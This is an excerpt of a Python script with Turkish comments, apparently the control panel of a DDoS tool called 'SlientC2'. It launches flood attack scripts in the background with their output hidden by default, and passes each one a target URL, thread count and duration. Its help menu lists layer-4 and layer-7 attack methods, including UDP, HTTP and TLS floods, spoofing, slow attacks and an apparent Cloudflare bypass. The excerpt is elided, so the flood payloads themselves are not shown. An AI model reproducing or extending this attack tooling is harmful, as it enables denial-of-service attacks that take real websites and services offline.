#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SlientC2 – Çıktılar varsayılan gizli, saldırı_goster/kapan ile kontrol
...
# ========== ÇIKTI KONTROL DEĞİŞKENİ ==========
CIKTI_GOSTER = False  # Varsayılan gizli
...
# ========== ÇIKTI KONTROL KOMUTLARI ==========
def cmd_cikti_goster():
    global CIKTI_GOSTER
    CIKTI_GOSTER = True
    print("[+] Saldırı çıktıları AÇILDI. Yeni saldırılarda çıktılar görünecek.")

def cmd_cikti_kapan():
    global CIKTI_GOSTER
    CIKTI_GOSTER = False
    print("[+] Saldırı çıktıları KAPATILDI. Yeni saldırılarda çıktılar gizlenecek.")

# ========== KOMUT İŞLEYİCİLER (ÇIKTI KONTROLLÜ) ==========
def run_script(script_name, args):
    ...
    try:
        if CIKTI_GOSTER:
            subprocess.Popen(cmd)  # Çıktılar terminale
        else:
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Gizli
    except Exception as e:
...
def run_cfpro_script(url, threads, seconds):
    ...
    try:
        if CIKTI_GOSTER:
            subprocess.Popen(["python3", "cf-pro.py", url, threads, seconds])
        else:
...
def cmd_l4():
    ...
    for line in l4_lines:
        print(gradient_text(pad + line))
    print(gradient_text(pad + " " * 4 + "Not: udp gerçek metodtur.\n"))
...
def cmd_help():
    ...
    for line in help_lines:
        print(gradient_text(pad + line))
    print(gradient_text(pad + " " * 4 + "Örnek: L7, Layer7, L4, Layer4, udp, httpflood, cfpro, flood, http-raw, http-socket, http-rand, https-spoof, tls, tls2, tls3, httpflood2, slow, saldırı_goster, saldırı_kapan, theme, clear, history, stop\n"))
